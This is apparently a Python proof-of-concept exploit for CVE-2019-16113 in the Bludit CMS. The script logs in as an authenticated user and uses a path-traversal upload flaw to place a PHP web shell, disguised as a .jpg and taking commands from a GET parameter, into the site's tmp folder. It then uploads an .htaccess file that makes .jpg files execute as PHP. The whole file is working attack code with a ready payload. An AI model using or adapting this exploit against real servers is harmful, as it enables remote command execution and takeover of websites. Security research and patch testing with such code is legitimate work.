#!/usr/bin/env python3
from requests import Session
from argparse import ArgumentParser
from colorama import init, Fore, Style
from secrets import choice
from string import ascii_letters, digits
from re import search


SHELL_PAYLOAD = '''<?php
if (isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);

    echo "<pre>$output</pre>";
}
?>'''
HTACCESS_PAYLOAD = '''RewriteEngine off
AddType application/x-httpd-php .jpg'''


def main(args):
    session = Session()

    if login(session, args.target, args.username, args.password):
        print_success('Successfully logged in')

        if upload_file(session, args.target, '../../tmp', f'{args.filename}.jpg', SHELL_PAYLOAD):
            print_success(f'Uploaded: {args.filename}.jpg')

            if upload_file(session, args.target, None, '.htaccess', HTACCESS_PAYLOAD):
                print_success('Uploaded: .htaccess')
                print_success('Done!')
                print_success(f'{args.target}/bl-content/tmp/{args.filename}.jpg')
            else:
                print_failure('Failed to upload .htaccess')
        else:
            print_failure(f'Failed to upload {args.filename}.jpg')
    else:
        print_failure('Failed to login with the specified username and password')

def login(session, url, username, password):
    login_url = f'{url}/admin/login'
    response = session.get(login_url)
    post_data = {
        'tokenCSRF': get_csrf_token(response.text),
        'username': username,
        'password': password,
        'save': ''
    }
    response = session.post(login_url, data = post_data, allow_redirects = False)

    if response.status_code == 301 and response.headers['Location'] == '/admin/dashboard':
        return True

    return False

def upload_file(session, url, uuid, file_name, file_data):
    response = session.get(f'{url}/admin/new-content')

    if not uuid:
        uuid = get_uuid(response.text)

    post_data = {
        'uuid': uuid,
        'tokenCSRF': get_csrf_token(response.text)
    }
    files = [
        ('images[]', (file_name, file_data, 'image/jpeg'))
    ]
    response = session.post(f'{url}/admin/ajax/upload-images', files = files, data = post_data)

    if response.status_code == 200 and response.headers['Content-Type'] == 'application/json':
        result = response.json()

        if result['status'] == 0:
            return True

        # In versions before 3.10.0, the uploaded file is moved to '/bl-content/tmp/' before a file extension check is performed.
        # https://github.com/bludit/bludit/blob/b1fc6cd0be012c038af7ad83ed2209bf7e976f88/bl-kernel/ajax/upload-images.php#L42
        if result['status'] == 1 and 'File type is not supported' in result['message']:
            return True
    
    return False
    
def generate_random_string(length):
    return ''.join(choice(ascii_letters + digits) for _ in range(length))

def get_csrf_token(text):
    return search('input.+?name="tokenCSRF".+?value="(.+?)"', text).group(1)

def get_uuid(text):
    return search('input.+?name="uuid".+?value="(.+?)"', text).group(1)

def print_success(message):
    print(f'{Style.BRIGHT}{Fore.GREEN}[ + ]{Style.RESET_ALL}{Fore.RESET} {message}')

def print_failure(message):
    print(f'{Style.BRIGHT}{Fore.RED}[ ! ]{Style.RESET_ALL}{Fore.RESET} {message}')

if __name__ == '__main__':
    arg_parser = ArgumentParser(description = 'PoC for CVE-2019-16113 which affects Bludit, a flat-file CMS.')

    arg_parser.add_argument('-f', '--file-name', dest = 'filename', type = str, default = generate_random_string(8), help = 'The name of the uploaded file without extension (Default: random)')

    required_args = arg_parser.add_argument_group('required arguments')

    required_args.add_argument('-t', '--target', type = str, required = True, help = 'URL of the Bludit target (Example: http[s]://127.0.0.1/bludit)')
    required_args.add_argument('-u', '--username', type = str, required = True, help = 'The username to authenticate')
    required_args.add_argument('-p', '--password', type = str, required = True, help = 'The password to authenticate')

    init()
    main(arg_parser.parse_args())
